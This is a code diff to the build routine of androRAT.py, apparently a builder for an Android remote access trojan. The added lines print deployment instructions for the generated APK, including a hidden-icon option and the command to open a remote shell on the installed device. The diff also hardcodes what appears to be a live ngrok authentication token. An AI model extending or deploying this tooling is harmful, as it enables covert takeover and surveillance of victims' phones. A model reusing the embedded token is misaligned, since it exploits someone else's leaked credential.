@@ -371,6 +371,19 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
         print(stdOutput("error")+"Java not installed or found")
         exit()
     
+    # Display connection configuration
+    print("\033[1m\033[36m")
+    print("="*60)
+    print("APK CONNECTION CONFIGURATION")
+    print("="*60+"\033[0m")
+    print(stdOutput("info")+"\033[1mServer IP: \033[32m"+ip)
+    print(stdOutput("info")+"\033[1mServer Port: \033[32m"+port)
+    print(stdOutput("info")+"\033[1mConnection URL: \033[32m"+ip+":"+port)
+    if ngrok:
+        print(stdOutput("info")+"\033[1mNgrok Token: \033[32m3AXOS7AFLjYl0kw7f1p7Tz2ySOq_7WGCDUCoFfGtymwrARAXF")
+    print(stdOutput("info")+"\033[1mApp Icon: \033[32m"+("Visible" if icon else "Hidden"))
+    print("\033[1m\033[36m"+"-"*60+"\033[0m")
+    
     print(stdOutput("info")+"\033[0mGenerating APK")
     outFileName = output if output else "karma.apk"
     que = queue.Queue()
@@ -394,6 +407,20 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
         resOut = que.get()
         if not resOut.returncode:
             print(stdOutput("success")+"Successfully signed the apk \033[1m\033[32m"+outFileName+"\033[0m")
+            print("\033[1m\033[36m")
+            print("="*60)
+            print("APK READY FOR DEPLOYMENT")
+            print("="*60+"\033[0m")
+            print(stdOutput("info")+"\033[1mAPK Location: \033[32m"+getpwd(outFileName))
+            print(stdOutput("info")+"\033[1mConnect to: \033[32m"+ip+":"+port)
+            if ngrok:
+                print(stdOutput("info")+"\033[1mNgrok Tunnel Active: \033[32mYES")
+            print("\n"+stdOutput("info")+"\033[1mNext Steps:")
+            print("  1. Install the APK on the device")
+            print("  2. Launch the app (it will show connection status)")
+            print("  3. Run: python3 androRAT.py --shell -i "+ip+" -p "+port)
+            print("\033[1m\033[36m"+"-"*60+"\033[0m\n")
+            
             if ngrok:
                 clear()
                 get_shell("0.0.0.0",8000) if not ng else get_shell("0.0.0.0",ng)
